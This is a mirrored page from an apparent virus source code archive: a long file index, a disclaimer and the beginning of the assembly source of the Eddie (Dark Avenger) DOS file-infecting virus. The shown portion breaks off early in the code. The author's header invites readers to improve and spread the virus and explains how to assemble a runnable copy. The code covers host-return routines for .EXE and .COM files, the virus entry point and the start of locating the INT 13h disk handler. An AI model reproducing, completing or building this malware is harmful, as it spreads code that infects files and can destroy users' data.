<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: avenge_asm</title>
<meta name="KEYWORDS" content="avenge.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for avenge.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="a86_berylium_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/a86_berylium_asm.php">a86_berylium_asm</a><br>
<a href="a86_dasboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/a86_dasboot_asm.php">a86_dasboot_asm</a><br>
<a href="abraxas5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/abraxas5_asm.php">abraxas5_asm</a><br>
<a href="abraxas__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/abraxas__asm.php">abraxas__asm</a><br>
<a href="abraxasb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/abraxasb_asm.php">abraxasb_asm</a><br>
<a href="ac1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ac1__asm.php">ac1__asm</a><br>
<a href="ac1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ac1_asm.php">ac1_asm</a><br>
<a href="acidtrip_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/acidtrip_asm.php">acidtrip_asm</a><br>
<a href="acme_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/acme_asm.php">acme_asm</a><br>
<a href="actifed_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/actifed_asm.php">actifed_asm</a><br>
<a href="addict1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict1_asm.php">addict1_asm</a><br>
<a href="addict2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict2_asm.php">addict2_asm</a><br>
<a href="addict3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict3_asm.php">addict3_asm</a><br>
<a href="addict4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict4_asm.php">addict4_asm</a><br>
<a href="addict5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict5_asm.php">addict5_asm</a><br>
<a href="addict6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict6_asm.php">addict6_asm</a><br>
<a href="addict7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict7_asm.php">addict7_asm</a><br>
<a href="addict8_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict8_asm.php">addict8_asm</a><br>
<a href="addict9_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/addict9_asm.php">addict9_asm</a><br>
<a href="adebug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/adebug_asm.php">adebug_asm</a><br>
<a href="afrca109_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/afrca109_asm.php">afrca109_asm</a><br>
<a href="agiplan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/agiplan_asm.php">agiplan_asm</a><br>
<a href="agplan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/agplan_asm.php">agplan_asm</a><br>
<a href="ahadisk_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ahadisk_asm.php">ahadisk_asm</a><br>
<a href="aid_s__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aid_s__asm.php">aid_s__asm</a><br>
<a href="aid(s)_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aid(s)_asm.php">aid(s)_asm</a><br>
<a href="aids_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aids_pas.php">aids_pas</a><br>
<a href="aircop__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aircop__asm.php">aircop__asm</a><br>
<a href="aircop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aircop_asm.php">aircop_asm</a><br>
<a href="aircopdr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aircopdr_asm.php">aircopdr_asm</a><br>
<a href="aircopng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aircopng_asm.php">aircopng_asm</a><br>
<a href="ala2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ala2_asm.php">ala2_asm</a><br>
<a href="ala_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ala_asm.php">ala_asm</a><br>
<a href="alameda1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/alameda1_asm.php">alameda1_asm</a><br>
<a href="alameda__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/alameda__asm.php">alameda__asm</a><br>
<a href="alameda_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/alameda_asm.php">alameda_asm</a><br>
<a href="alchemy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/alchemy_asm.php">alchemy_asm</a><br>
<a href="alemeda_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/alemeda_asm.php">alemeda_asm</a><br>
<a href="almeda__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/almeda__asm.php">almeda__asm</a><br>
<a href="almed____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/almed____asm.php">almed____asm</a><br>
<a href="almed_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/almed_asm.php">almed_asm</a><br>
<a href="alter_fa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/alter_fa_asm.php">alter_fa_asm</a><br>
<a href="ambul1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ambul1_asm.php">ambul1_asm</a><br>
<a href="ambul2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ambul2_asm.php">ambul2_asm</a><br>
<a href="ambul3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ambul3_asm.php">ambul3_asm</a><br>
<a href="ambul_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ambul_asm.php">ambul_asm</a><br>
<a href="amf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amf_asm.php">amf_asm</a><br>
<a href="amst_299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst_299_asm.php">amst_299_asm</a><br>
<a href="amst-299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst-299_asm.php">amst-299_asm</a><br>
<a href="amst-345_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst-345_asm.php">amst-345_asm</a><br>
<a href="amst_740_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst_740_asm.php">amst_740_asm</a><br>
<a href="amst-740_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst-740_asm.php">amst-740_asm</a><br>
<a href="amst-740_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst-740_bas.php">amst-740_bas</a><br>
<a href="amst-847_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst-847_asm.php">amst-847_asm</a><br>
<a href="amst-847_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst-847_bas.php">amst-847_bas</a><br>
<a href="amst-852_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/amst-852_asm.php">amst-852_asm</a><br>
<a href="anath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anath_asm.php">anath_asm</a><br>
<a href="ang_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ang_asm.php">ang_asm</a><br>
<a href="angela_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/angela_asm.php">angela_asm</a><br>
<a href="anna_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anna_asm.php">anna_asm</a><br>
<a href="annoyer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/annoyer_asm.php">annoyer_asm</a><br>
<a href="ant_daf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ant_daf_asm.php">ant_daf_asm</a><br>
<a href="anthrax_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anthrax_asm.php">anthrax_asm</a><br>
<a href="antiblin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/antiblin_asm.php">antiblin_asm</a><br>
<a href="antiburg_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/antiburg_asm.php">antiburg_asm</a><br>
<a href="anticom2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anticom2_asm.php">anticom2_asm</a><br>
<a href="anticom3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anticom3_asm.php">anticom3_asm</a><br>
<a href="anticom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anticom_asm.php">anticom_asm</a><br>
<a href="anti_da__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti_da__asm.php">anti_da__asm</a><br>
<a href="anti_daf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti_daf_asm.php">anti_daf_asm</a><br>
<a href="anti-daf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti-daf_asm.php">anti-daf_asm</a><br>
<a href="antidaf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/antidaf_asm.php">antidaf_asm</a><br>
<a href="anti-d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti-d_asm.php">anti-d_asm</a><br>
<a href="anti_mit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti_mit_asm.php">anti_mit_asm</a><br>
<a href="anti-mit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti-mit_asm.php">anti-mit_asm</a><br>
<a href="anti_mon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti_mon_asm.php">anti_mon_asm</a><br>
<a href="antipas_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/antipas_asm.php">antipas_asm</a><br>
<a href="antipode_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/antipode_asm.php">antipode_asm</a><br>
<a href="anti_tel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anti_tel_asm.php">anti_tel_asm</a><br>
<a href="ant_uri_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ant_uri_asm.php">ant_uri_asm</a><br>
<a href="anzuelo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/anzuelo_asm.php">anzuelo_asm</a><br>
<a href="ap_400_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap_400_asm.php">ap_400_asm</a><br>
<a href="ap-400__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap-400__asm.php">ap-400__asm</a><br>
<a href="ap-400_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap-400_asm.php">ap-400_asm</a><br>
<a href="ap_440_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap_440_asm.php">ap_440_asm</a><br>
<a href="ap-440_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap-440_asm.php">ap-440_asm</a><br>
<a href="ap_480_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap_480_asm.php">ap_480_asm</a><br>
<a href="ap-480_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap-480_asm.php">ap-480_asm</a><br>
<a href="ap_529_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap_529_asm.php">ap_529_asm</a><br>
<a href="ap-529_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap-529_asm.php">ap-529_asm</a><br>
<a href="ap_605_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap_605_asm.php">ap_605_asm</a><br>
<a href="ap-605_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ap-605_asm.php">ap-605_asm</a><br>
<a href="a_pasca__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/a_pasca__asm.php">a_pasca__asm</a><br>
<a href="a_pascal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/a_pascal_asm.php">a_pascal_asm</a><br>
<a href="arbeit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/arbeit_asm.php">arbeit_asm</a><br>
<a href="arcadez_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/arcadez_asm.php">arcadez_asm</a><br>
<a href="archer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/archer_asm.php">archer_asm</a><br>
<a href="arc_hub_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/arc_hub_asm.php">arc_hub_asm</a><br>
<a href="arcvscrl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/arcvscrl_asm.php">arcvscrl_asm</a><br>
<a href="arg100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/arg100_asm.php">arg100_asm</a><br>
<a href="arg110_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/arg110_asm.php">arg110_asm</a><br>
<a href="argent_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/argent_asm.php">argent_asm</a><br>
<a href="aristotl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/aristotl_asm.php">aristotl_asm</a><br>
<a href="armag911_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/armag911_asm.php">armag911_asm</a><br>
<a href="armaged__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/armaged__asm.php">armaged__asm</a><br>
<a href="armagedo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/armagedo_asm.php">armagedo_asm</a><br>
<a href="arpnet_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/arpnet_pas.php">arpnet_pas</a><br>
<a href="art_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/art_asm.php">art_asm</a><br>
<a href="asex_099_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/asex_099_asm.php">asex_099_asm</a><br>
<a href="asex-099_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/asex-099_asm.php">asex-099_asm</a><br>
<a href="asex_100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/asex_100_asm.php">asex_100_asm</a><br>
<a href="asex-100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/asex-100_asm.php">asex-100_asm</a><br>
<a href="asexual_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/asexual_asm.php">asexual_asm</a><br>
<a href="ash-449_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ash-449_asm.php">ash-449_asm</a><br>
<a href="ash_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/ash_asm.php">ash_asm</a><br>
<a href="asp_472_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/asp_472_asm.php">asp_472_asm</a><br>
<a href="asp-472_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/asp-472_asm.php">asp-472_asm</a><br>
<a href="at_144_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/at_144_asm.php">at_144_asm</a><br>
<a href="at-144_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/at-144_asm.php">at-144_asm</a><br>
<a href="at_149_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/at_149_asm.php">at_149_asm</a><br>
<a href="at-149_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/at-149_asm.php">at-149_asm</a><br>
<a href="atomic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/atomic_asm.php">atomic_asm</a><br>
<a href="attach_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/attach_pas.php">attach_pas</a><br>
<a href="attit548_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/attit548_asm.php">attit548_asm</a><br>
<a href="avenge_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/avenge_asm.php">avenge_asm</a><br>
<a href="avenger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/avenger_asm.php">avenger_asm</a><br>
<a href="avengsrc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/avengsrc_asm.php">avengsrc_asm</a><br>
<a href="azeuss_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/azeuss_asm.php">azeuss_asm</a><br>
<a href="azusa__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/azusa__asm.php">azusa__asm</a><br>
<a href="azusa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/azusa_asm.php">azusa_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/1/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/1/index.php'" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/b/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/b/index.php'" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/c/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/c/index.php'" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/d/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/d/index.php'" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/e/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/e/index.php'" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/f/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/f/index.php'" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/h/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/h/index.php'" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/i/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/i/index.php'" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/j/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/j/index.php'" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/k/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/k/index.php'" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/l/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/l/index.php'" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/m/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/m/index.php'" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/n/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/n/index.php'" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/o/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/o/index.php'" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/p/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/p/index.php'" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/q/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/q/index.php'" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/r/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/r/index.php'" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/s/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/s/index.php'" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/t/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/t/index.php'" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/u/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/u/index.php'" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/v/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/v/index.php'" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/w/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/w/index.php'" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/x/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/x/index.php'" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/y/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/y/index.php'" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it is addressed on a domain or path outside the boundaries set for its Starting Address.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;************************
;*                      *
;*      E D D I E       *
;*                      *
;*   by  Dark Avenger   *
;*                      *
;*      3-JAN-1989      *
;*                      *
;*     version 1.31x    *
;*                      *
;************************

; "Blessed is he who expects nothing, for he shall not be disappointed."

; The original source of one of the first Bulgarian viruses is in front of
; you.  As you may notice, it's full of rubbish and bugs, but nevertheless
; the virus has spread surprisingly quickly troughout the country and made a
; quick round the globe.  (It's well-known in Eastern and Western Europe, as
; well as in USA.) Due to the aniversary of its creation, the source is
; distributed freely.  You have the rights to distribute the source which can
; be charged or free of charge, with the only condition not to modify it.
; The one, who intentionaly distributes this source modified in any way will
; be punished!  Still, the author will be glad if any of you improves it and
; spreads the resulting executive file (i.e., the virus itself).  Pay
; attention to the fact that after you assemble the source, the resulting
; .COM-file cannot be run.  For that purpose you have to create a three-byte
; file, consisting of the hex numbers 0e9h, 68h, 0 and then to combine the
; two files.  Don't try to place a JMP at the beginning of the source.

; DISCLAIMER: The author does not take any responsability for any damage,
; either direct or implied, caused by the usage or not of this source or of
; the resulting code after assembly. No warrant is made about the product
; functionability or quality.

; I cannot resist to express my special gratitude to my "populazer" Dipl.
; eng. Vesselin Bontchev, who makes me famous and who, wishing it or
; not, helps very much in the spreading of my viruses, in spite of the fact
; that he tries to do just the opposite (writing programs in C has never
; led to any good).
; Greetings to all virus writers!

code    segment
        assume  cs:code,ds:code

copyright:
        db      'Eddie lives...somewhere in time!',0
date_stamp:
        dd      12239000h
checksum:
        db      30

; Return the control to an .EXE file:
; Restores DS=ES=PSP, loads SS:SP and CS:IP.





exit_exe:
        mov     bx,es
        add     bx,10h
        add     bx,word ptr cs:[si+call_adr+2]
        mov     word ptr cs:[si+patch+2],bx
        mov     bx,word ptr cs:[si+call_adr]
        mov     word ptr cs:[si+patch],bx
        mov     bx,es
        add     bx,10h
        add     bx,word ptr cs:[si+stack_pointer+2]
        mov     ss,bx
        mov     sp,word ptr cs:[si+stack_pointer]
        db      0eah                    ;JMP XXXX:YYYY
patch:
        dd      0

; Returns control to a .COM file:
; Restores the first 3 bytes in the
; beginning of the file, loads SP and IP.

exit_com:




        mov     di,100h
        add     si,offset my_save
        movsb
        movsw
        mov     sp,ds:[6]               ;This is incorrect
        xor     bx,bx
        push    bx
        jmp     [si-11]                 ;si+call_adr-top_file

; Program entry point

startup:
        call    relative
relative:
        pop     si                      ;SI = $
        sub     si,offset relative
        cld
        cmp     word ptr cs:[si+my_save],5a4dh
        je      exe_ok
        cli
        mov     sp,si                   ;A separate stack is supported for
        add     sp,offset top_file+100h ;the .COM files, in order not to
        sti                             ;overlap the stack by the program
        cmp     sp,ds:[6]
        jnc     exit_com
exe_ok:
        push    ax
        push    es
        push    si
        push    ds
        mov     di,si

; Looking for the address of INT 13h handler in ROM-BIOS

        xor     ax,ax
        push    ax
        mov     ds,ax
        les     ax,ds:[13h*4]
        mov     word ptr cs:[si+fdisk],ax       ;save existing 13H handler here
